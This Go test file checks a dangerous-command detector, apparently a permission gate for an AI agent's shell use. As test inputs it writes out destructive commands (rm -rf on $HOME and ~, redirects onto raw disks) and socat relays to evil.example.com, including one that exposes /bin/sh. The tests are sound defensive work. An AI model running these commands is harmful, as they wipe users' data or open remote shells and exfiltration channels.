package permission

// Regression probes for #3061/#3062:
//   - 3061-C1: whole-home deletions must be Critical in EVERY shape -
//     $HOME with trailing path, ~ with/without -f, ~/* (the old \s*$ anchor
//     missed `$HOME/...` and `~` had no Critical rule at all, so bypass/
//     autopilot released them with zero confirmation).
//   - 3061-C2: redirecting onto a raw disk is Critical with the FULL device
//     family (nvme/rdisk/mmcblk...), not Medium sd[a-z] only.
//   - 3062: pure-local socat IPC (UNIX-CONNECT etc.) must not be flagged as
//     network exfiltration; remote channels still are.

import (
	"testing"
)

func issue3061Shapes() map[string]bool {
	return map[string]bool{
		"rm -rf $HOME":          true,
		"rm -rf $HOME/":         true, // missed by the old \s*$ anchor
		"rm -rf $HOME/projects": true, // missed by the old \s*$ anchor
		`rm -rf "$HOME"`:        true,
		"rm -rf ~":              true,
		"rm -rf ~/":             true,
		"rm -rf ~/projects":     true,
		"rm -r ~":               true, // no -f: matched NOTHING before
		"rm -fr ~":              true,
	}
}

func TestIssue3061_C1_HomeDeletionShapesAreCritical(t *testing.T) {
	d := NewDangerousDetector()
	for cmd := range issue3061Shapes() {
		chk := d.Check(cmd)
		if chk.Level < DangerCritical {
			t.Errorf("#3061-C1: %q = {level:%v}, want Critical (zero-confirm home deletion under bypass)", cmd, chk.Level)
		}
	}
	// Ordinary relative rm and mere $HOME references stay non-Critical.
	if chk := d.Check("rm -rf ./build"); chk.Level >= DangerCritical {
		t.Errorf("ordinary relative rm must not be Critical, got %v", chk.Level)
	}
	if chk := d.Check("echo $HOME"); chk.Level >= DangerCritical {
		t.Errorf("merely referencing $HOME must not be Critical, got %v", chk.Level)
	}
}

func TestIssue3061_C2_RawDiskRedirectCriticalFullFamily(t *testing.T) {
	d := NewDangerousDetector()
	for _, cmd := range []string{
		"> /dev/sda",
		"cat img > /dev/nvme0n1",
		"cat img > /dev/rdisk2",
		"pv img > /dev/mmcblk0",
		"cat img > /dev/vdb",
	} {
		chk := d.Check(cmd)
		if chk.Level < DangerCritical {
			t.Errorf("#3061-C2: %q = {level:%v}, want Critical (dd of= parity, full device family)", cmd, chk.Level)
		}
	}
	// /dev/null keeps its benign handling.
	if chk := d.Check("echo x > /dev/null"); chk.Level >= DangerCritical {
		t.Fatalf("/dev/null redirect must not be Critical, got %v", chk.Level)
	}
}

func TestIssue3062_LocalSocatNotExfiltrate(t *testing.T) {
	// Pure-local IPC: must NOT be flagged as network exfiltration.
	if IsNetworkExfiltrate("socat - UNIX-CONNECT:/tmp/agent.sock") {
		t.Fatal("#3062: local UNIX-CONNECT socat misclassified as exfiltration")
	}
	if IsNetworkExfiltrate("socat UNIX-LISTEN:/tmp/debug.sock -") {
		t.Fatal("#3062: local UNIX-LISTEN socat misclassified as exfiltration")
	}
	// Remote relays still flagged.
	if !IsNetworkExfiltrate("socat - TCP:evil.example.com:443") {
		t.Fatal("remote TCP socat must stay exfiltration")
	}
	if !IsNetworkExfiltrate("socat TCP-LISTEN:9999,fork EXEC:/bin/sh") {
		t.Fatal("EXEC relay socat must stay exfiltration")
	}
	if !IsNetworkExfiltrate("socat - OPENSSL:evil.example.com:443") {
		t.Fatal("OPENSSL relay socat must stay exfiltration")
	}
}
